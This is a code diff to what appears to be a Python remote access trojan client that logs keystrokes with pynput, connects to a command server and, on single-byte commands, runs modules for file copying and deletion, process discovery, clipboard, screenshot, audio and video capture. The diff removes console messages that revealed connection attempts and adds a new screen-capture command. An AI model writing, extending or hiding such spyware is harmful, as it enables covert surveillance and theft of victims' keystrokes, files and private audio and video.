@@ -4,10 +4,11 @@ import socket
 import logging
 import time
 from pynput.keyboard import Listener
-from modules.client_RDP import (gather_system_info, command_line_interface, 
+from modules.client_module import (gather_system_info, command_line_interface, 
                                 file_directory_discovery, remote_file_copy,
                                 file_deletion, process_discovery, input_capture,
-                                clipboard_data, screen_capture, audio_capture, video_capture)
+                                clipboard_data, screenshot_capture, audio_capture,
+                                video_capture, screen_capture)
 
 LOG_FILE = "keys.txt"
 SERVER_ADDRESS = ("127.0.0.1", 585)
@@ -24,10 +25,8 @@ def connect_to_server():
             server.connect(SERVER_ADDRESS)
             operation_system = platform.system()
             server.send(operation_system[0].encode())
-            print("connected")
             return server, operation_system
         except ConnectionError:
-            print("Connection failed. Retrying in 5 seconds...")
             time.sleep(RETRY_INTERVAL)
 
 def main():
@@ -59,18 +58,21 @@ def main():
                     elif byte == "8":
                         clipboard_data(server)
                     elif byte == "9":
-                        screen_capture(server)
+                        screenshot_capture(server)
                     elif byte == "A":
                         audio_capture(server)
                     elif byte == "B":
                         video_capture(server)
+                    elif byte == "C":
+                        screen_capture(server)
+                        print("bomba")
                     elif byte == "S":
                         break
                 except socket.error as e:
                     print(f"Error: {e}")
                     break
         except Exception as e:
-            print(f"Error connecting to the server: {e}")
+            print(f"{e}")
             time.sleep(RETRY_INTERVAL)
 
 if __name__ == "__main__":
